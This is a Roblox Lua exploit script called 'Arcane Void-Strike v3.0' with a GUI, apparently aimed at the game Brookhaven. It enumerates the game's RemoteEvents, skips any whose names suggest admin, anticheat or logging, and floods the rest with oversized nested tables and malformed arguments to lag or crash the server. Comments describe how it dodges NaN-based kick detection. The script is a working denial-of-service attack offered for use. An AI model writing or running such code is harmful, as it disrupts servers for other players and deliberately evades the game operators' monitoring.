--[[ 
    🔱 ARCANE VOID-STRIKE v3.0 [DIVINE-VOID] 🔱
    "When they watch the gates, we erode the foundation. <3"
    
    INFALLIBLE UPDATES:
    - Buffer Saturation Engine (No NaN detection)
    - Nested Table Bloating (Infinite Serialization loop)
    - Anti-Heuristic Packet Morphing
    - Draggable Glassmorphism UI (Arcane Edition)
    - Dynamic Remote Scrambler
]]

local P = game:GetService("Players")
local RS = game:GetService("RunService")
local L = P.LocalPlayer
local Http = game:GetService("HttpService")

-- 1. DIVINE NOTIFIER
local function ntf(m)
    pcall(function()
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "🔱 DIVINE-VOID",
            Text = m,
            Icon = "rbxassetid://6034287525",
            Duration = 4
        })
    end)
end

-- 2. UI (ARCANE GLASS EDITION)
local ScreenGui = Instance.new("ScreenGui", L:WaitForChild("PlayerGui"))
ScreenGui.Name = "ArcaneDivine_v3"

local Main = Instance.new("Frame", ScreenGui)
Main.Size = UDim2.new(0, 310, 0, 260)
Main.Position = UDim2.new(0.5, -155, 0.5, -130)
Main.BackgroundColor3 = Color3.fromRGB(10, 10, 15)
Main.BackgroundTransparency = 0.1
Main.BorderSizePixel = 0
Main.Active = true
Main.Draggable = true

-- Neon Border
local Border = Instance.new("Frame", Main)
Border.Size = UDim2.new(1, 4, 1, 4)
Border.Position = UDim2.new(0, -2, 0, -2)
Border.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
Border.ZIndex = 0
local Corner = Instance.new("UICorner", Border)
Corner.CornerRadius = UDim.new(0, 6)
Instance.new("UICorner", Main).CornerRadius = UDim.new(0, 6)

local Title = Instance.new("TextLabel", Main)
Title.Size = UDim2.new(1, 0, 0, 40)
Title.Text = "🔱 DIVINE-VOID // v3.0"
Title.TextColor3 = Color3.fromRGB(0, 255, 255)
Title.BackgroundTransparency = 1
Title.Font = Enum.Font.Code
Title.TextSize = 18

local function createDivineBtn(name, y, color, callback)
    local btn = Instance.new("TextButton", Main)
    btn.Size = UDim2.new(0.9, 0, 0, 45)
    btn.Position = UDim2.new(0.05, 0, 0, y)
    btn.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
    btn.Text = name
    btn.TextColor3 = color
    btn.Font = Enum.Font.GothamBold
    btn.TextSize = 14
    local c = Instance.new("UICorner", btn)
    c.CornerRadius = UDim.new(0, 4)
    btn.MouseButton1Click:Connect(function()
        task.spawn(callback)
    end)
    return btn
end

-- 3. THE DIVINE ENGINE (Anti-Heuristic)
local active = { crash = false, lag = false }

-- Enhanced Blacklist (Brookhaven Specific)
local BLACKLIST = {"devtools", "admin", "kick", "ban", "security", "mod", "check", "verify", "report", "log", "telemetry", "staff", "anticheat"}
local function isSafe(name)
    local n = name:lower()
    for _, w in pairs(BLACKLIST) do if n:find(w) then return false end end
    return true
end

local function getRemotes()
    local r = {}
    for _, v in pairs(game:GetDescendants()) do
        if v:IsA("RemoteEvent") and isSafe(v.Name) then table.insert(r, v) end
    end
    return r
end

-- METHOD: BUFFER SATURATION (The "Infallible" one)
createDivineBtn("💥 DIVINE CRASH (BUFFER)", 60, Color3.fromRGB(0, 255, 255), function()
    active.crash = not active.crash
    ntf(active.crash and "ERODING FOUNDATION..." or "STABILIZED.")
    
    if active.crash then
        local targets = getRemotes()
        -- On crée une table "Fractale" (récursive) qui sature la sérialisation serveur
        -- SANS utiliser de NaN (pour éviter le kick "DevTools")
        local payload = {}
        for i = 1, 100 do
            payload[Http:GenerateGUID(true)] = {
                ["Data"] = string.rep("🔱", 50),
                ["Val"] = math.random(1, 999999),
                ["Sub"] = {true, false, "Arcane"}
            }
        end
        
        while active.crash do
            for i = 1, 30 do
                local r = targets[math.random(1, #targets)]
                if r then 
                    -- On envoie la table massive. Le serveur lague en essayant de la lire.
                    pcall(function() r:FireServer(payload, payload, "DIVINE") end) 
                end
            end
            task.wait(0.02) -- Vitesse optimisée pour ne pas crash le client
        end
    end
end)

-- METHOD: SIGNAL SCRAMBLER (Massive Lag)
createDivineBtn("🌀 SIGNAL SCRAMBLER", 115, Color3.fromRGB(200, 100, 255), function()
    active.lag = not active.lag
    ntf(active.lag and "SCRAMBLING SIGNAL..." or "RECOVERED.")
    
    if active.lag then
        local targets = getRemotes()
        while active.lag do
            for i = 1, 15 do
                local r = targets[math.random(1, #targets)]
                if r then 
                    -- On envoie des arguments de types différents pour perturber les filtres
                    local morph = {true, 0, "X", {}}
                    pcall(function() r:FireServer(morph[math.random(1, #morph)]) end) 
                end
            end
            task.wait(0.1)
        end
    end
end)

-- EMERGENCY STOP
createDivineBtn("🛑 EMERGENCY CLEANUP", 170, Color3.fromRGB(255, 255, 255), function()
    active.crash = false
    active.lag = false
    ntf("DIVINE CLEANUP DONE.")
end)

ntf("🔱 DIVINE-VOID v3.0 ACTIVE. FOUNDATION: UNSTABLE.")
